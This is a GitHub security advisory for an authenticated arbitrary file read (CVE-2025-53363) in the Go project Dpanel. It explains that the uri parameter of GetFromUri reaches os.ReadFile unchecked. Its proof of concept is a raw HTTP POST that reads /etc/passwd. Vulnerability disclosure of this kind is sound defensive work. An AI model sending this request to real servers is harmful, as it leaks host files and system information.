# [M] Dpanel has an arbitrary file read vulnerability

## Summary
Severity: Medium
Advisory: GHSA-gcqf-pxgg-gw8q
CVE: CVE-2025-53363
CWE: CWE-22, CWE-73
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-08-22
Source: https://github.com/advisories/GHSA-gcqf-pxgg-gw8q
Type: github-advisory

## Affected
- Go: `github.com/donknap/dpanel` — affected >=1.2.0

## Details
### Summary
Dpanel has an arbitrary file read vulnerability in the /api/app/compose/get-from-uri interface.Logged in to Dpanel ,this interface can be used to read arbitrary files.

### Details
When a user logs into the administrative backend, this interface can read any files on the host/sever (given the necessary permissions), which may lead to system information leakage. The vulnerability lies in the GetFromUri function within the app/application/http/controller/compose.go file. The uri parameter submitted by the user in JSON format can be directly read and returned by os.ReadFile without proper security handling.
![image-20250702004157585](https://github.com/user-attachments/assets/1f0e683b-bf0b-49e6-8d68-833fcf3f214d)
![image-20250702004223184](https://github.com/user-attachments/assets/b5e89e02-f572-4edf-aaa8-566dea090d3f)

### PoC
```text
POST /api/app/compose/get-from-uri HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJ......lWg==
Connection: close
Content-Type: application/json
Content-Length: 21

{"uri":"/etc/passwd"}
```

### Impact
This vulnerability could lead to the leakage of sensitive server file information. In versions from 1.2.0 up to the latest (1.7.2), logged-in users can make requests to this interface.

## References
- https://github.com/donknap/dpanel/security/advisories/GHSA-gcqf-pxgg-gw8q
- https://nvd.nist.gov/vuln/detail/CVE-2025-53363
- https://github.com/donknap/dpanel
- https://pkg.go.dev/vuln/GO-2025-3909
